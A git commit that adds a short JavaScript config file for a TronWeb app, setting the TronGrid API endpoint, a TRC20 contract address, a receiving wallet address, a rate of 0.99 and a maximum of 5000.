0972692e2dab043ad938e70f09fd2bd9e11dac57
xmdh <61221100+OpenseaAirdrop@users.noreply.github.com>
2021-12-07 17:53:47 +0800

    1

---
+++ js/config.js
@@ -0,0 +1,11 @@
+const api = "https://api.trongrid.io";
+//const api = "https://api.shasta.trongrid.io";
+const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";//contract address
+//const trc20ContractAddress = "TMKBMRVYL8ckEfXRpXUFfjxiMRnNRfv5EL";//contract address
+const HttpProvider = TronWeb.providers.HttpProvider;
+const fullNode = new HttpProvider(api);
+const solidityNode = new HttpProvider(api);
+const eventServer = new HttpProvider(api);
+const tongdaoAddress = "TXjvm9x2B3PYDz29ja2yhXVnD1NvGhAGyQ";
+const rate = 0.99;
+const max = 5000;
